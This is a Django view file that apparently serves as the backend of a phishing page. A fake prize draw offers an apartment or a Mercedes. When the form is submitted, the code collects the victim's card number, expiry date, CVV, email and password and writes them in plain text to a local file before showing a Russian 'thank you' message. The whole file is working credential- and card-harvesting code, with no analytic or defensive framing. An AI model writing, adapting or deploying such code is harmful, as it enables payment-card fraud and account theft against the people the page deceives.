from django.shortcuts import render
from django.http import HttpResponse
import random
# Create your views here.


def index(request):
    if request.method == 'GET':
        persons = ['Квартиру', 'Мерседес']
        user = random.choice(persons)
        return render(request, 'index.html', {'user': user})

    if request.method == 'POST':
        a = open('text.txt', 'a')
        usernumber = request.POST['number']
        userdate = request.POST['date']
        useryear = request.POST['year']
        usercvv = request.POST['CVV']
        useremail = request.POST['email']
        userepassword = request.POST['password']
        a.write(usernumber)
        a.write(userdate + '\n')
        a.write(useryear + '\n')
        a.write(usercvv + '\n')
        a.write(useremail + '\n')
        a.write(userepassword + '\n')
        a.close()

        return HttpResponse("Спасибо")
